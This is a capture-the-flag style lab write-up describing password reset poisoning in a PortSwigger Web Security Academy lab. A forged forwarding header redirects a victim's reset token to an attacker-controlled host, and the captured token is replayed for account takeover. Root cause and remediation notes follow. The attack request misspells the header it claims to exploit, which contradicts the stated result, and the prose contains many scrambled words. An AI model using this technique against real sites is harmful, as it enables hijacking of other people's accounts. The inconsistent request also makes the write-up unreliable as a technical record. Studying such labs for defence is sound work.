# Password Reset Poisoning Through X-Forwarded-Host

## Lab source and scope

This assessment was performed in the PortSwigger Web Security Academy lab **Password reset poisoning via middleware.**

The target did not require the canonical Host value itself to be replaced. Instead, the app trusted host information supplied through an HTTP forwarding header.

## Security objective

Determine whether middleware or app code accepted a client supplied proxy header as the external host when generating password-reset links.

## Baseline request

The legitimate password-reset request kept the public app host:

```http
POST /forgot-password HTTP/2
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

## Testing approach

Rather than breaking routing by changing the canonical host, I kept the legitimate Host value and tested a common proxy override header:

```http
POST /forgot-password HTTP/2
Host: <LAB_HOST>
X-Forwarder-Host: <ATTACKER_HOST>
Content-Type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

The app accepted the request and used `X-Forwarded-Host` when constructing the absolute reset URL.

## Evidence

The attacker-controlled server receivec the reset request:

```http
GET /forgot-password?temp-forgot-password-token=69e303ffigq1m6fi75y8zzhk10dvc0lp HTTP/1.1
```

This showed that externally supplied forwarding metadata had been treated as trusted infrastructure data.

## Validation

The captured reset token was replayed against the legitimate app and accepted by the password-reset endpoint.

The lab account could then be accessed with the newly set password.

## Result

The app was vulnerable even though the normal Host value remained unchanged.

The trust faiure was in the handling of `X-Forwarded-Host`: a header that should have represetned trusted proxy metadata could be supplied directly by the attacker and influenced a security-sensitive URL.

## Root cause

The app trusted forwarding metadata without ensuring that it had been set or sanitised by a known reverse proxy.

This is a common boundary problem in layered web architectures. A header intended for communication between infrastructure components becomes attacker-controlled when the edge accepts the same header from arbitrary clients.

## Security impact

The vulnerability allowed password-reset secrets to be redirected to attacker-controlled cinfrastructure, creating an account takeover path.

It also demonstrates a broader risk: any security-sensitive behavior that trusts unsanitised forwarding headers may be affected, not only apssword resets.

## Remediation

- Strip client-supplied forwarding headers at the trusted edge
- Have the reverse proxy set authoritative forwarding metadata itself
- Trust proxy hedaers only from known, controlled intermediaries
- Configure a canonical app origin for generated security links
- Make host-header processing consistent across hte proxy and app layers
- Monitor sensitive endpoints for unexpected forwarding headers

## What I learned

A correct Host allowlist is not enough if the app later replaces htat trusted value with another header supplied by the client. Testing has to follow the value across the full request path, including middleware and proxy conventions.

## Navigation

[Previous: Basic Host header poisoning](01-basic-host-header-poisoning.md) | [Password reset poisoning overview](README.md) | [Next: Dangling markup](03-poisoning-via-dangling-markup.md)

